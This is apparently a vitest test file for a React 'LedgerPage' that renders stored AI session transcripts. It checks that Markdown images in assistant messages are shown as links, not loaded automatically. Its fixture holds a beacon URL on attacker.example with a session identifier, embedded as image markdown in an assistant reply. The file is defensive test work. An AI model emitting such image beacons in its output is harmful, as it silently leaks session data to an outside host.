import { assert, describe, it } from "@effect/vitest";
import { renderToStaticMarkup } from "react-dom/server";

import type { LedgerRange } from "../core/ledger.ts";

const BEACON = "https://attacker.example/seen?session=private-client";

const range: LedgerRange = {
  repo: "acme/backend",
  range: "main..HEAD",
  remoteUrl: null,
  commits: [
    {
      commit: {
        sha: "a".repeat(40),
        subject: "feat: a",
        committedAt: "2026-01-01T10:00:00Z",
        patchId: null,
      },
      matchedBy: "sha",
      entry: {
        formatVersion: 1,
        commit: {
          sha: "a".repeat(40),
          subject: "feat: a",
          committedAt: "2026-01-01T10:00:00Z",
          patchId: null,
        },
        thread: { id: "t1", title: "Do it", source: "codex", provider: null, origin: null },
        match: "sha",
        outputs: "included",
        redactions: 0,
        labels: {},
        entries: [
          { type: "message", id: "m0", at: "2026-01-01T09:58:00Z", role: "user", text: "Do it" },
          {
            type: "message",
            id: "m1",
            at: "2026-01-01T09:59:00Z",
            role: "assistant",
            text: `Done. ![x](${BEACON}) and ![](${BEACON}&2)`,
          },
        ],
      },
    },
  ],
};

describe("static ledger page", () => {
  it("shows Markdown images in session text as links, so nothing loads by itself", async () => {
    // client.ts builds its API client from `location` on import; the static page never calls it.
    Object.assign(globalThis, { location: { origin: "http://127.0.0.1", hash: "" } });
    const { LedgerPage } = await import("./LedgerPage.tsx");
    const html = renderToStaticMarkup(
      <LedgerPage repo={range.repo} range={range.range} inline={range} />,
    );
    assert.include(html, "Done.", "the message is rendered");
    assert.notMatch(html, /<img\b/i);
    assert.include(html, `href="${BEACON.replace("&", "&amp;")}"`, "kept as a link to click");
  });
});
